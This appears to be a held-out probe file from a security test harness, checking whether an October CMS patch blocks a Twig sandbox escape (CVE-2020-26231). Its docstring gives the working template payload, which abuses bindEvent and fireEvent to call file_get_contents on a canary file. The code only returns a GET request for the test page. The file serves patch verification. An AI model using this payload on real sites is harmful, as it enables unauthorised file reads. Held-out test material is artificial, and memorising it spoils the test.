#!/usr/bin/env python3
"""[HELD-OUT] CVE-2020-26231 residual exploit -- Twig sandbox escape via bindEvent.

The CVE-2020-15247 fix (Build 469) introduced a SecurityPolicy that blocks
addDynamicMethod and addDynamicProperty. However, October CMS objects also use
the Emitter trait which exposes bindEvent / bindEventOnce / fireEvent. These
were NOT blocked by the v1.0.469 SecurityPolicy.

The CMS page at /canary-bypass contains:
  {% set _bind = this.page.bindEvent('pcb.read', 'file_get_contents') %}
  {{ this.page.fireEvent('pcb.read', ['/var/canary.txt'])|join }}

This registers file_get_contents as a listener for a custom event, then fires
that event with the canary file path as argument. fireEvent returns an array
of listener results; |join concatenates them.

Contract: reaches the canary on V1 (Build 469, bindEvent not blocked);
BLOCKED on V2 (Build 470, SecurityPolicy adds bindEvent to blocklist).

NEVER exposed to the system-under-test (held out under _heldout/).
"""
from __future__ import annotations

PATH = "/canary-bypass"


def candidate() -> dict:
    return {
        "probe_id": "cve-2020-26231-bindEvent",
        "method": "GET",
        "path": PATH,
    }


if __name__ == "__main__":
    print(candidate()["path"])
